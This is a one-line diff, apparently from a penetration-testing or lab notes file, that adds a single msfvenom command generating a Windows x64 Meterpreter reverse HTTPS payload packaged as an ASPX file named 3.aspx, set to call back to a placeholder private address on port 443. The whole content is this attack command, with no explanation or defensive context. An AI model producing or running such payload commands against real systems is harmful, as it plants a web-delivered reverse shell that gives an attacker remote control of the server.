@@ -1,0 +1,1 @@
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.Y LPORT=443 -f aspx -o 3.aspx
